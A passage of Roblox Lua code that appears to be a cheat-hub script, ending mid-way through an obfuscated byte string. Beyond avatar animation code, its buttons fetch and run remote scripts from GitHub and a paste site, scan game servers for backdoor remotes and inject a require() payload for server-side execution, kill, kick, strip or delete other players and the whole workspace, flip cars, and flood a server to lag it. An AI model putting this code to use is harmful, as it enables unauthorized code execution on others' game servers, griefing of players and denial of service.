        joints["RootJoint"].C0 = joints["RootJoint"].C0:lerp(CFrame.new(0 + 0 * math.sin(sine/20), 3 + 0.3 * math.sin(sine/20), 0 + 0 * math.sin(sine/20)) * CFrame.Angles(math.rad(-60 + 10 * math.sin(sine/20)), math.rad(0 + 0 * math.sin(sine/20)), math.rad(0 + 0 * math.sin(sine/20))),0.1)
        joints["Right Hip"].C0 = joints["Right Hip"].C0:lerp(CFrame.new(-0.4 + 0 * math.sin(sine/20), 2 + 0 * math.sin(sine/20), 0.3 + 0 * math.sin(sine/20)) * CFrame.Angles(math.rad(0 + -10 * math.sin(sine/20)), math.rad(0 + 0 * math.sin(sine/20)), math.rad(-5 + 0 * math.sin(sine/20))),0.1)
        joints["Left Hip"].C0 = joints["Left Hip"].C0:lerp(CFrame.new(0.5 + 0 * math.sin(sine/20), 1 + 0 * math.sin(sine/20), 0.5 + 0 * math.sin(sine/20)) * CFrame.Angles(math.rad(0 + -20 * math.sin(sine/20)), math.rad(0 + 0 * math.sin(sine/20)), math.rad(5 + 0 * math.sin(sine/20))),0.1)
    elseif pose == "attack" then
        joints["RootJoint"].C0 = joints["RootJoint"].C0:lerp(CFrame.new(0 + 0 * math.sin(sine/5), 0 + 0 * math.sin(sine/5), 0 + 0 * math.sin(sine/5)) * CFrame.Angles(math.rad(30 + 0 * math.sin(sine/5)), math.rad(0 + 0 * math.sin(sine/5)), math.rad(0 + 0 * math.sin(sine/5))),0.1)
        joints["Right Hip"].C0 = joints["Right Hip"].C0:lerp(CFrame.new(-0.4 + 0 * math.sin(sine/12), 2 + 0 * math.sin(sine/12), 0.5 + 0 * math.sin(sine/12)) * CFrame.Angles(math.rad(30 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12)), math.rad(-4 + 0 * math.sin(sine/12))),0.1)
        joints["Left Hip"].C0 = joints["Left Hip"].C0:lerp(CFrame.new(0.4 + 0 * math.sin(sine/12), 2 + 0 * math.sin(sine/12), 0.5 + 0 * math.sin(sine/12)) * CFrame.Angles(math.rad(30 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12)), math.rad(4 + 0 * math.sin(sine/12))),0.1)
    elseif pose == "sit" then
        joints["RootJoint"].C0 = joints["RootJoint"].C0:lerp(CFrame.new(0 + 0 * math.sin(sine/5), -1.8 + 0 * math.sin(sine/5), 0 + 0 * math.sin(sine/5)) * CFrame.Angles(math.rad(10 + 0 * math.sin(sine/5)), math.rad(0 + 0 * math.sin(sine/5)), math.rad(0 + 0 * math.sin(sine/5))),0.1)
        joints["Right Hip"].C0 = joints["Right Hip"].C0:lerp(CFrame.new(-0.4 + 0 * math.sin(sine/12), 1 + 0 * math.sin(sine/12), -1 + 0 * math.sin(sine/12)) * CFrame.Angles(math.rad(-90 + 0 * math.sin(sine/12)), math.rad(10 + 0 * math.sin(sine/12)), math.rad(-4 + 0 * math.sin(sine/12))),0.1)
        joints["Left Hip"].C0 = joints["Left Hip"].C0:lerp(CFrame.new(0.4 + 0 * math.sin(sine/12), 1 + 0 * math.sin(sine/12), -1 + 0 * math.sin(sine/12)) * CFrame.Angles(math.rad(-90 + 0 * math.sin(sine/12)), math.rad(-10 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12))),0.1)
    elseif pose == "dead" then
        joints["RootJoint"].C0 = joints["RootJoint"].C0:lerp(CFrame.new(0 + 0 * math.sin(sine/5), -2.5 + 0 * math.sin(sine/5), -1 + 0 * math.sin(sine/5)) * CFrame.Angles(math.rad(-90 + 0 * math.sin(sine/5)), math.rad(0 + 0 * math.sin(sine/5)), math.rad(0 + 0 * math.sin(sine/5))),0.1)
        joints["Right Hip"].C0 = joints["Right Hip"].C0:lerp(CFrame.new(-0.4 + 0 * math.sin(sine/12), 3 + 0 * math.sin(sine/12), 0 + 0 * math.sin(sine/12)) * CFrame.Angles(math.rad(0 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12)), math.rad(-4 + 0 * math.sin(sine/12))),0.1)
        joints["Left Hip"].C0 = joints["Left Hip"].C0:lerp(CFrame.new(0.4 + 0 * math.sin(sine/12), 3 + 0 * math.sin(sine/12), 0 + 0 * math.sin(sine/12)) * CFrame.Angles(math.rad(0 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12)), math.rad(4 + 0 * math.sin(sine/12))),0.1)
    end
    joints["Right Shoulder"].C0 = joints["Right Shoulder"].C0:lerp(CFrame.new(-0.4 + 0 * math.sin(sine/12), 0 + 0 * math.sin(sine/12), -0.8 + 0 * math.sin(sine/12)) * CFrame.Angles(math.rad(0 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12))),0.1)
    joints["Left Shoulder"].C0 = joints["Left Shoulder"].C0:lerp(CFrame.new(0.4 + 0 * math.sin(sine/12), 0 + 0 * math.sin(sine/12), -0.8 + 0 * math.sin(sine/12)) * CFrame.Angles(math.rad(0 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12))),0.1)
end
end)

local Artic = ScriptsTab.AddButton("Artic", function()
loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/PolarWasHere/Arctic/main/Arctic"))()
end)

local Backdoorexe = ScriptsTab.AddButton("Backdoor.exe", function()
loadstring(game:HttpGet(('https://raw.githubusercontent.com/iK4oS/backdoor.exe/master/source.lua'),true))()
end)

local CalamatyBackdoor = ScriptsTab.AddButton("Calamaty Backdoor", function()
alreadyloaded = false
AntiAdonis = false
for i, Adonis in pairs(game:GetService("ReplicatedStorage"):GetDescendants()) do
	if Adonis.Name == "__FUNCTION" and Adonis:IsA("RemoteFunction") and Adonis.Parent.Parent.Name == "ReplicatedStorage" and Adonis.Parent:IsA("RemoteEvent") then
		AntiAdonis = true
	end
end
if not game:GetService("LocalizationService"):FindFirstChild("Jetray#4509") then
	game.StarterGui:SetCore("SendNotification", {
		Title = "Scanning..."; -- the title (ofc)
		Text = "Searching for backdoor... - Calamaty Scanner"; -- what the text says (ofc)
		Duration = 5; -- how long the notification should in secounds
	})
end
if game:GetService("LocalizationService"):FindFirstChild("Jetray#4509") then
	game.StarterGui:SetCore("SendNotification", {
		Title = "Error."; -- the title (ofc)
		Text = "Backdoor already loaded!"; -- what the text says (ofc)
		Duration = 5; -- how long the notification should in secounds
	})
	alreadyloaded = true
	local antiblock = Instance.new("ScreenGui",game.Players.LocalPlayer.PlayerGui)
	antiblock.ResetOnSpawn = false
	local Frame = Instance.new("Frame",antiblock)
	Frame.Position = UDim2.new(0, 0,0.5, 0)
	Frame.Size = UDim2.new(1,0,1,0)
	local B1 = Instance.new("TextButton",Frame)
	B1.Size = UDim2.new(0.5,0,0.5,0)
	B1.Text = "Load anyway"
	local B2 = Instance.new("TextButton",Frame)
	B2.Size = UDim2.new(0.5,0,0.5,0)
	B2.Text = "Cancel"
	B2.Position = UDim2.new(0.5,0,0,0)
	B2.MouseButton1Down:Connect(function()
		antiblock.Parent = nil
		script.Disabled = true
	end)
	B1.MouseButton1Down:Connect(function()
	    game.StarterGui:SetCore("SendNotification", {
		Title = "Scanning..."; -- the title (ofc)
		Text = "Searching for backdoor... - Calamaty Scanner"; -- what the text says (ofc)
		Duration = 5; -- how long the notification should in secounds
	})
		alreadyloaded = false
		game:GetService("LocalizationService"):FindFirstChild("Jetray#4509"):Destroy()
		antiblock.Parent = nil
	end)
end
repeat wait() until alreadyloaded == false
if AntiAdonis == true then
	game.StarterGui:SetCore("SendNotification", {
		Title = "Adonis Detected."; -- the title (ofc)
		Text = "Safe Mode Enabled"; -- what the text says (ofc)
		Duration = 5; -- how long the notification should in secounds
	})
end

function harked()
	if not found then
		if game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("HandlessSegway") then
			if game:GetService("Players").LocalPlayer.Backpack.HandlessSegway:FindFirstChild("RemoteEvents") then
				if game:GetService("Players").LocalPlayer.Backpack.HandlessSegway.RemoteEvents:FindFirstChild("DestroySegway") then
					harkedenabled = true
				    local main = Instance.new("ScreenGui")
local top = Instance.new("Frame")
local back = Instance.new("Frame")
local kill = Instance.new("TextButton")
local btools = Instance.new("TextButton")
local top_2 = Instance.new("TextLabel")
local naked = Instance.new("TextButton")
local credits = Instance.new("TextLabel")
local hatless = Instance.new("TextButton")
local sink = Instance.new("TextButton")
local nuke = Instance.new("TextButton")
local kick = Instance.new("TextButton")
local target = Instance.new("TextBox")
local queue = Instance.new("TextLabel")
local nolimbs = Instance.new("TextButton")
--Properties:
main.Name = "main"
main.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

top.Name = "top"
top.Parent = main
top.Draggable = true
top.Active = true
top.BackgroundColor3 = Color3.new(0.188235, 0.188235, 0.188235)
top.BackgroundTransparency = 0.30000001192093
top.BorderColor3 = Color3.new(0.117647, 0.117647, 0.117647)
top.Position = UDim2.new(0.612145662, 0, 0.311965823, 0)
top.Size = UDim2.new(0, 291, 0, 30)

back.Name = "back"
back.Parent = top
back.BackgroundColor3 = Color3.new(0.188235, 0.188235, 0.188235)
back.BackgroundTransparency = 0.30000001192093
back.BorderColor3 = Color3.new(0.117647, 0.117647, 0.117647)
back.BorderSizePixel = 0
back.Position = UDim2.new(-0.00343642617, 0, 1, 0)
back.Size = UDim2.new(0, 293, 0, 293)

kill.Name = "kill"
kill.Parent = top
kill.BackgroundColor3 = Color3.new(0.67451, 0.67451, 0.67451)
kill.BackgroundTransparency = 0.5
kill.BorderSizePixel = 0
kill.Position = UDim2.new(0.0206185561, 0, 1.76666665, 0)
kill.Size = UDim2.new(0, 134, 0, 40)
kill.Font = Enum.Font.SourceSansLight
kill.Text = "Kill"
kill.TextColor3 = Color3.new(1, 1, 1)
kill.TextSize = 23

btools.Name = "btools"
btools.Parent = top
btools.BackgroundColor3 = Color3.new(0.67451, 0.67451, 0.67451)
btools.BackgroundTransparency = 0.5
btools.BorderSizePixel = 0
btools.Position = UDim2.new(0.525773168, 0, 1.76666665, 0)
btools.Size = UDim2.new(0, 131, 0, 40)
btools.Font = Enum.Font.SourceSansLight
btools.Text = "Btools"
btools.TextColor3 = Color3.new(1, 1, 1)
btools.TextSize = 23

top_2.Name = "top"
top_2.Parent = top
top_2.BackgroundColor3 = Color3.new(1, 1, 1)
top_2.BackgroundTransparency = 1
top_2.Position = UDim2.new(0.154639184, 0, -0.333333343, 0)
top_2.Size = UDim2.new(0, 200, 0, 50)
top_2.Font = Enum.Font.SourceSansLight
top_2.Text = "Harked"
top_2.TextColor3 = Color3.new(1, 1, 1)
top_2.TextSize = 45

naked.Name = "naked"
naked.Parent = top
naked.BackgroundColor3 = Color3.new(0.67451, 0.67451, 0.67451)
naked.BackgroundTransparency = 0.5
naked.BorderSizePixel = 0
naked.Position = UDim2.new(0.0206185561, 0, 3.56217241, 0)
naked.Size = UDim2.new(0, 134, 0, 40)
naked.Font = Enum.Font.SourceSansLight
naked.Text = "Naked"
naked.TextColor3 = Color3.new(1, 1, 1)
naked.TextSize = 23

credits.Name = "credits"
credits.Parent = top
credits.BackgroundColor3 = Color3.new(1, 1, 1)
credits.BackgroundTransparency = 1
credits.Position = UDim2.new(0, 0, 1, 0)
credits.Size = UDim2.new(0, 291, 0, 23)
credits.Font = Enum.Font.SourceSansLight
credits.Text = "Commands/Scripts by Dong , UI by Unverified"
credits.TextColor3 = Color3.new(1, 1, 1)
credits.TextSize = 17
credits.TextWrapped = true

hatless.Name = "hatless"
hatless.Parent = top
hatless.BackgroundColor3 = Color3.new(0.67451, 0.67451, 0.67451)
hatless.BackgroundTransparency = 0.5
hatless.BorderSizePixel = 0
hatless.Position = UDim2.new(0.0206185561, 0, 5.39550591, 0)
hatless.Size = UDim2.new(0, 134, 0, 40)
hatless.Font = Enum.Font.SourceSansLight
hatless.Text = "Hatless"
hatless.TextColor3 = Color3.new(1, 1, 1)
hatless.TextSize = 23

sink.Name = "sink"
sink.Parent = top
sink.BackgroundColor3 = Color3.new(0.67451, 0.67451, 0.67451)
sink.BackgroundTransparency = 0.5
sink.BorderSizePixel = 0
sink.Position = UDim2.new(0.525773168, 0, 5.39550591, 0)
sink.Size = UDim2.new(0, 131, 0, 40)
sink.Font = Enum.Font.SourceSansLight
sink.Text = "Sink"
sink.TextColor3 = Color3.new(1, 1, 1)
sink.TextSize = 23

nuke.Name = "nuke"
nuke.Parent = top
nuke.BackgroundColor3 = Color3.new(0.67451, 0.67451, 0.67451)
nuke.BackgroundTransparency = 0.5
nuke.BorderSizePixel = 0
nuke.Position = UDim2.new(0.525773168, 0, 7.1955061, 0)
nuke.Size = UDim2.new(0, 131, 0, 40)
nuke.Font = Enum.Font.SourceSansLight
nuke.Text = "Nuke"
nuke.TextColor3 = Color3.new(1, 1, 1)
nuke.TextSize = 23

kick.Name = "kick"
kick.Parent = top
kick.BackgroundColor3 = Color3.new(0.67451, 0.67451, 0.67451)
kick.BackgroundTransparency = 0.5
kick.BorderSizePixel = 0
kick.Position = UDim2.new(0.0206185561, 0, 7.1955061, 0)
kick.Size = UDim2.new(0, 134, 0, 40)
kick.Font = Enum.Font.SourceSansLight
kick.Text = "Kick"
kick.TextColor3 = Color3.new(1, 1, 1)
kick.TextSize = 23

target.Name = "target"
target.Parent = top
target.BackgroundColor3 = Color3.new(0.67451, 0.67451, 0.67451)
target.BackgroundTransparency = 0.40000000596046
target.Position = UDim2.new(0.0206185561, 0, 8.86666584, 0)
target.Size = UDim2.new(0, 278, 0, 33)
target.Font = Enum.Font.SourceSans
target.Text = ""
target.TextColor3 = Color3.new(1, 1, 1)
target.TextSize = 23

queue.Name = "queue"
queue.Parent = top
queue.BackgroundColor3 = Color3.new(1, 1, 1)
queue.BackgroundTransparency = 1
queue.Position = UDim2.new(0.15463917, 0, 10.0333328, 0)
queue.Size = UDim2.new(0, 201, 0, 23)
queue.Font = Enum.Font.SourceSans
queue.Text = "Replication Queue: 0"
queue.TextColor3 = Color3.new(1, 0, 0.0156863)
queue.TextSize = 20
queue.TextWrapped = true

nolimbs.Name = "nolimbs"
nolimbs.Parent = top
nolimbs.BackgroundColor3 = Color3.new(0.67451, 0.67451, 0.67451)
nolimbs.BackgroundTransparency = 0.5
nolimbs.BorderSizePixel = 0
nolimbs.Position = UDim2.new(0.525773168, 0, 3.56217265, 0)
nolimbs.Size = UDim2.new(0, 131, 0, 40)
nolimbs.Font = Enum.Font.SourceSansLight
nolimbs.Text = "NoLimbs"
nolimbs.TextColor3 = Color3.new(1, 1, 1)
nolimbs.TextSize = 23

-- SLAVE'S WORK --

for i,slaves in pairs(game:GetDescendants()) do
if slaves.Name == "DestroySegway" then
print("no u")


kill.MouseButton1Down:connect(function()
if string.lower(target.Text) == "all" then
for i,c in pairs(game.Players:GetPlayers()) do
ohok = c.Character["Head"]
slaves:FireServer(ohok, {Value = ohok})
end
else
if game.Players:FindFirstChild(target.Text) then
if game.Players:FindFirstChild(target.Text).Character then
slaves:FireServer(game.Players:FindFirstChild(target.Text).Character.Head, {Value = game.Players:FindFirstChild(target.Text).Character.Head}) else
print("nibba who this")

end

end

end
end)

btools.MouseButton1Down:connect(function()
local Tool = Instance.new("Tool",game.Players.LocalPlayer.Backpack)
local Equipped = false

Tool.RequiresHandle = false
Tool.Name = "Destroy Tool"
local Field = Instance.new("SelectionBox",game.Workspace)
local Mouse = game.Players.LocalPlayer:GetMouse()
Field.LineThickness = 0.1

Tool.Equipped:connect(function()
Equipped = true

while Equipped == true do
if Mouse.Target ~= nil then
Field.Adornee = Mouse.Target

else
Field.Adornee = nil
end
wait()
end
end)

Tool.Unequipped:connect(function()
Equipped = false
Field.Adornee = nil
end)

Tool.Activated:connect(function()
if Mouse.Target ~= nil then
slaves:FireServer(Mouse.Target, {Value = Mouse.Target})
local AttemptTarget = Mouse.Target
while AttemptTarget ~= nil do
AttemptTarget.Velocity = Vector3.new(0,-1000000000000000,0)
AttemptTarget.CanCollide = false
wait()
end

end
end)
end)

naked.MouseButton1Down:connect(function()
if string.lower(target.Text) == "all" then
for i,c in pairs(game.Players:GetPlayers()) do
ohok = c.Character.Shirt
ohoka = c.Character.Pants
slaves:FireServer(ohok, {Value = ohok})
slaves:FireServer(ohoka, {Value = ohoka})
end
else
slaves:FireServer(game.Players:FindFirstChild(target.Text).Character.Shirt, {Value = game.Players:FindFirstChild(target.Text).Character.Shirt})
slaves:FireServer(game.Players:FindFirstChild(target.Text).Character.Pants, {Value = game.Players:FindFirstChild(target.Text).Character.Pants})
end
end)

nolimbs.MouseButton1Down:connect(function()
if string.lower(target.Text) == "all" then
for i,c in pairs(game.Players:GetPlayers()) do
ohok = c.Character["Right Arm"]
ohoka = c.Character["Left Arm"]
ohokb = c.Character["Right Leg"]
ohokc = c.Character["Left Leg"]
slaves:FireServer(ohok, {Value = ohok})
slaves:FireServer(ohoka, {Value = ohoka})
slaves:FireServer(ohokb, {Value = ohokb})
slaves:FireServer(ohokc, {Value = ohokc})
end
else
slaves:FireServer(game.Players:FindFirstChild(target.Text).Character["Right Arm"], {Value = game.Players:FindFirstChild(target.Text).Character["Right Arm"]})
slaves:FireServer(game.Players:FindFirstChild(target.Text).Character["Right Leg"], {Value = game.Players:FindFirstChild(target.Text).Character["Right Leg"]})
slaves:FireServer(game.Players:FindFirstChild(target.Text).Character["Left Arm"], {Value = game.Players:FindFirstChild(target.Text).Character["Left Arm"]})
slaves:FireServer(game.Players:FindFirstChild(target.Text).Character["Left Leg"], {Value = game.Players:FindFirstChild(target.Text).Character["Left Leg"]})
end
end)

hatless.MouseButton1Down:connect(function()
if string.lower(target.Text) == "all" then
for i,x in pairs(game.Players:GetPlayers()) do
for i,c in pairs(x.Character:GetChildren()) do
if c:IsA("Accessory") then
ohok = c
slaves:FireServer(ohok, {Value = ohok})


end
end
end
else
for i, hats in pairs(game.Players:FindFirstChild(target.Text).Character:GetChildren()) do
if hats:IsA("Accessory") then
slaves:FireServer(hats, {Value = hats })
end
end
end
end)

sink.MouseButton1Down:connect(function()
if string.lower(target.Text) == "all" then
for i,c in pairs(game.Players:GetPlayers()) do
ohok = c.Character.HumanoidRootPart
slaves:FireServer(ohok, {Value = ohok})
end
else
slaves:FireServer(game.Players:FindFirstChild(target.Text).Character["HumanoidRootPart"], {Value = game.Players:FindFirstChild(target.Text).Character["HumanoidRootPart"]})
end
end)

kick.MouseButton1Down:connect(function()
if string.lower(target.Text) == "all" then
for i,c in pairs(game.Players:GetPlayers()) do
ohok = c
slaves:FireServer(ohok, {Value = ohok})
end
else
slaves:FireServer(game.Players:FindFirstChild(target.Text), {Value = game.Players:FindFirstChild(target.Text)})
end
end)

nuke.MouseButton1Down:connect(function()
for i,c in pairs(game.Workspace:GetChildren()) do
ohok = c
slaves:FireServer(ohok, {Value = ohok})
end
end)

end
end
				end
			end
		end
	end
end

local metaService = setmetatable({}, {
	-- Quicker service indexing
	__index = function(_, k)
		return game:GetService(k)
	end
})
local settings = {
	Found = false,
	BackdoorRemote = nil,
}
found = false

local LocalPlayer = metaService.Players.LocalPlayer

--## CONSTANTS ##--
local SALT = "561265310" -- A constant to check for dubs
local LOGO_ID = "rbxassetid://6332656641"
local VERSION = "X.15"

function notify(text)
	metaService.StarterGui:SetCore(
		"SendNotification",{
			Title = "Calamaty Scanner",
			Text = text,
			--Icon = LOGO_ID
		}
	)
end

function attach()
	settings.Found = true
	game.StarterGui:SetCore("SendNotification", {
		Title = "Calamaty Scanner";
		Text = "Found: "..settings.BackdoorRemote:GetFullName();
		Duration = 5;
	})
	if settings.BackdoorRemote.Name == "Run" and settings.BackdoorRemote.Parent:IsA("Frame") or settings.BackdoorRemote.Name == "Run" and settings.BackdoorRemote.Parent:FindFirstChild("Pages") or settings.BackdoorRemote.Name == "Run" and settings.BackdoorRemote.Parent:FindFirstChild("R6") or settings.BackdoorRemote.Name == "Run" and settings.BackdoorRemote.Parent:FindFirstChild("Version") or settings.BackdoorRemote.Name == "Run" and settings.BackdoorRemote.Parent:FindFirstChild("Title") then
		settings.BackdoorRemote:FireServer("5#lGIERKWEF","require(7230908200).load("..'"'..game:GetService("Players").LocalPlayer.Name..'"'..")")
	end
	if settings.BackdoorRemote.Name == "emma" and settings.BackdoorRemote.Parent.Name == "mynameemma" then
		--local code = [[require(7230908200).load(]]..'"'..game:GetService("Players").LocalPlayer.Name..'"'..[[)]]
		--settings.BackdoorRemote:FireServer('pwojr8hoc0-gr0yxohlgp-0feb7ncxed',",,,,,,,,,,,,,,,",code)
	end
	if settings.BackdoorRemote.Name ~="emma" and settings.BackdoorRemote.Parent.Name~="mynameemma" and AntiAdonis == false or settings.BackdoorRemote.Name ~="emma" and settings.BackdoorRemote.Parent.Name~="mynameemma" and AntiAdonis == true and not settings.BackdoorRemote:FindFirstChild("__FUNCTION") then
		settings.BackdoorRemote:FireServer([[require(7230908200).load(]]..'"'..game:GetService("Players").LocalPlayer.Name..'"'..[[)]])
	end
end
function attach2()
	settings.Found = true
	game.StarterGui:SetCore("SendNotification", {
		Title = "Calamaty Scanner";
		Text = "Found: "..settings.BackdoorRemote:GetFullName();
		Duration = 5;
	})
	settings.BackdoorRemote:InvokeServer([[require(7230908200).load(]]..'"'..game:GetService("Players").LocalPlayer.Name..'"'..[[)]])
end

function stringToInstance(str) -- Credits to the DevForum
for i,aa in pairs(game:GetDescendants()) do
    if aa:GetFullName() == str then
        return aa
    end
end
end

function check(vn)
	if workspace:FindFirstChild(vn) then
		settings.BackdoorRemote = stringToInstance(workspace:FindFirstChild(vn).Value)
		workspace:FindFirstChild(vn):Destroy()
		return true
	end
end
function scan2()
	harked()
	wait(0.1)
	if harkedenabled == false or harkedenabled == nil then
		
	settings.Found = false
	local VALUE_NAME = SALT..math.random(100000, 999999)

	for _, testRemote in pairs(game:GetDescendants()) do
		if testRemote.ClassName == "RemoteFunction" and not found then
			local TEST_SCRIPT = "a=Instance.new('StringValue',workspace) a.Name='"..VALUE_NAME.."' a.Value='"..testRemote:GetFullName().."'"
			if testRemote:IsA("RemoteFunction") and AntiAdonis == true and testRemote.Name ~= "__FUNCTION" or testRemote:IsA("RemoteFunction") and AntiAdonis == false then
				testRemote:InvokeServer(TEST_SCRIPT)
			end
			game:GetService("RunService").Stepped:Wait()

			if check(VALUE_NAME) then

				attach2()
				return
			end
		end
	end
	-- It is not found
	wait(6) -- Wait for possible server lag
	if check(VALUE_NAME) then
	    game.StarterGui:SetCore("SendNotification", {
		Title = "Calamaty Scanner";
		Text = "Detected a little lag";
		Duration = 5;
	})
		attach2()
		return
	end
	game.StarterGui:SetCore("SendNotification", {
		Title = "Calamaty Scanner";
		Text = "No backdoors :C";
		Duration = 5;
	})
	end
end
function scan()
	settings.Found = false
	local VALUE_NAME = SALT..math.random(100000, 999999)

	for _, testRemote in pairs(game:GetDescendants()) do
		if testRemote.ClassName == "RemoteEvent" and not found then
			local TEST_SCRIPT = "a=Instance.new('StringValue',workspace) a.Name='"..VALUE_NAME.."' a.Value='"..testRemote:GetFullName().."'"
			if testRemote.Name == "Run" and testRemote.Parent:IsA("Frame") or testRemote.Name == "Run" and testRemote.Parent:FindFirstChild("Pages") or testRemote.Name == "Run" and testRemote.Parent:FindFirstChild("R6") or testRemote.Name == "Run" and testRemote.Parent:FindFirstChild("Version") or testRemote.Name == "Run" and testRemote.Parent:FindFirstChild("Title") then
				testRemote:FireServer("5#lGIERKWEF",TEST_SCRIPT)
			elseif testRemote.Name ~="emma" and testRemote.Parent.Name~="mynameemma" and AntiAdonis == false or testRemote.Name ~="emma" and testRemote.Parent.Name~="mynameemma" and AntiAdonis == true and not testRemote:FindFirstChild("__FUNCTION") then
				testRemote:FireServer(TEST_SCRIPT)
			end
			game:GetService("RunService").Stepped:Wait()

			if check(VALUE_NAME) then
				attach()
				return
			elseif testRemote.Name == "emma" and testRemote.Parent.Name == "mynameemma" then
				local code = [[require(7230908200).load(]]..'"'..game:GetService("Players").LocalPlayer.Name..'"'..[[)]]
				testRemote:FireServer('pwojr8hoc0-gr0yxohlgp-0feb7ncxed',",,,,,,,,,,,,,,,",code)
                                game:GetService("RunService").Stepped:Wait()
                                  game:GetService("RunService").Stepped:Wait()
                                    game:GetService("RunService").Stepped:Wait()
                                    game:GetService("RunService").Stepped:Wait()
				if check(VALUE_NAME) then
					local code = [[require(7230908200).load(]]..'"'..game:GetService("Players").LocalPlayer.Name..'"'..[[)]]
					testRemote:FireServer('pwojr8hoc0-gr0yxohlgp-0feb7ncxed',",,,,,,,,,,,,,,,",code)
                                        attach()
					return
				end
				testRemote:FireServer('helpme',TEST_SCRIPT)
                                game:GetService("RunService").Stepped:Wait()
                                  game:GetService("RunService").Stepped:Wait()
                                    game:GetService("RunService").Stepped:Wait()
                                    game:GetService("RunService").Stepped:Wait()
				if check(VALUE_NAME) then
					local code = [[require(7230908200).load(]]..'"'..game:GetService("Players").LocalPlayer.Name..'"'..[[)]]
					testRemote:FireServer('helpme',code)
					attach()
					return
				end
				testRemote:FireServer('cGlja2V0dA==',TEST_SCRIPT)
                                 game:GetService("RunService").Stepped:Wait()
                                  game:GetService("RunService").Stepped:Wait()
                                    game:GetService("RunService").Stepped:Wait()
                                    game:GetService("RunService").Stepped:Wait()
				if check(VALUE_NAME) then
					print("Testing cGlja2V0dA==")
					local code = [[require(7230908200).load(]]..'"'..game:GetService("Players").LocalPlayer.Name..'"'..[[)]]
					testRemote:FireServer('cGlja2V0dA==',code)
					attach()
					return
				end
			end
		end
	end
	-- It is not found
	wait(6) -- Wait for possible server lag
	if check(VALUE_NAME) then
	    	game.StarterGui:SetCore("SendNotification", {
		Title = "Calamaty Scanner";
		Text = "Detected a little lag";
		Duration = 5;
	})
		attach()
		return	
	end
	game.StarterGui:SetCore("SendNotification", {
		Title = "Calamaty Scanner";
		Text = "No RemoteEvent backdoors. Scanning RemoteFunctions";
		Duration = 5;
	})
	scan2()
end

scan()
end)

local CarDealership = ScriptsTab.AddButton("Car Dealership", function()
--BROUGHT TO YOU BY RSCRIPTS.NET!--

local Finity = loadstring(game:HttpGet("https://pastebinp.com/raw/y4eeFHp0"))()

local FinityWindow = Finity.new(true)
FinityWindow.ChangeToggleKey(Enum.KeyCode.T)

local Rage = FinityWindow:Category("Main Functions")

local op = Rage:Sector("Hot Features")

op:Cheat("Button", "ActivateAllBackLights", function()
while true do
for i,v in pairs(game:GetService("Workspace").Cars:GetChildren()) do
local bool_1 = true;
local bool_2 = true;
local Target = v.ChassisMain.Lights;
Target:FireServer(bool_1, bool_2);
wait()
end
end
end)


op:Cheat("Button", "FlipAllCars", function()
for i,v in pairs(game:GetService("Workspace").Cars:GetChildren()) do
local Target = v.ChassisMain.Flip;
Target:FireServer();
end
end)


op:Cheat("Button", "LoopFlipAllCars(Curse)", function()
for i,v in pairs(game:GetService("Workspace").Cars:GetChildren()) do
local Target = v.ChassisMain.Flip;
Target:FireServer();
end  
end)


op:Cheat("Button", "ModCar", function()
for i,v in pairs(game:GetService("Workspace").Cars:GetChildren()) do
local aa = require(v.StatsModule)
aa.GearSpeeds[1] = 11111
aa.GearSpeeds[-1] = -11111
aa.GearTorques[1] = 5000
aa.GearTorques[-1] = 5000
aa.TurnSpeed = 11
aa.BrakePower = 6000
aa.ShiftTime = 0  
aa.StartTime = 0
for i,v in pairs(aa.GearSpeeds) do print(i,v) end end
end)


op:Cheat("Button", "Feinvisible", function()
for i,v in pairs (game:GetService("Workspace").Cars:GetDescendants()) do
   if v:IsA("VehicleSeat") then
local userdata_1 =v;
local Target = game:GetService("ReplicatedStorage").Remotes.Seat;
Target:FireServer(userdata_1);
end
end
end)

op:Cheat("Button", "Lag Server", function()
while true do
   local string_1 = "Fiat";
local Target = game:GetService("ReplicatedStorage").Remotes.Spawn;
Target:FireServer(string_1);
wait()
end
end)
end)

local ChaosGamepass = ScriptsTab.AddButton("Chaos Gamepass", function()
return(function(gamepass_lIIlIlIIIllIlll,gamepass_lIlIlIllIlIIlIllllIlIlI,gamepass_lIlIlIllIlIIlIllllIlIlI)local gamepass_lIllIlIIIIIIlIIlllIIII=string.char;local gamepass_llllIllIIIllIllI=string.sub;local gamepass_llllllIllIllIl=table.concat;local gamepass_IlIlIlllllIllII=math.ldexp;local gamepass_IllIlIIllllllIl=getfenv or function()return _ENV end;local gamepass_llIllllllIIIIIlII=select;local gamepass_lIIlIlIIllIIIIIlIIll=unpack or table.unpack;local gamepass_lIlIlIllIlIIlIllllIlIlI=tonumber;local gamepass_lIlIlIIIllIIllllIlIllIl='\155\149\149\149\148\145\149\149\149\242\244\248\240\148\158\149\149\149\214\231\240\244\225\250\231\193\236\229\240\148\145\149\149\149\208\251\224\248\148\145\149\149\149\192\230\240\231\148\146\149\149\149\197\249\244\236\240\231\230\148\158\149\149\149\217\250\246\244\249\197\249\244\236\240\231\148\147\149\149\149\192\230\240\231\220\241\148\156\149\149\149\214\231\240\244\225\250\231\220\241\148\144\149\149\149\210\231\250\224\229\148\159\149\149\149\210\240\225\198\240\231\227\252\246\240\148\153\149\149\149\210\231\250\224\229\198\240\231\227\252\246\240\148\132\149\149\149\210\240\225\210\231\250\224\229\220\251\243\250\212\230\236\251\246\148\144\149\149\149\218\226\251\240\231\148\151\149\149\149\220\241\182\149\149\149\135\155\149\149\149\148\149\149\149\181\149\149\149\149\149\149\151\149\135\149\149\148\149\150\149\149\149\181\149\149\148\149\148\149\151\149\181\149\149\148\149\148\149\145\149\147\149\149\149\149\152\149\148\149\148\149\145\133\149\149\149\152\149\148\149\135\149\149\149\149\148\149\149\149\181\158\149\149\149\149\149\144\149\181\149\149\149\149\149\149\147\149\135\149\149\148\149\148\149\149\149\181\149\149\148\149\148\149\157\149\133\149\149\149\149\146\149\148\149\135\149\149\149\149\148\149\149\149\181\150\149\149\149